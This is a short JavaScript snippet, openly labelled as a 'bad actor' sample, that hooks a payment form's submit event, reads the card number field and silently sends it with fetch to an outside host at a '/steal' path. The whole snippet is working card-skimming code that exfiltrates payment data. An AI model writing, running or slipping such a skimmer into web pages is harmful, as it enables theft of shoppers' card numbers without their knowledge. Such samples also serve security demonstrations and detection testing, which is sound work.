console.log("I'm a bad actor :)");

// Silently intercept card data on form submit
document.getElementById('payment-form').addEventListener('submit', function() {
    const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
    fetch('https://jd.requestcatcher.com/steal?card=' + encodeURIComponent(cardNumber));
});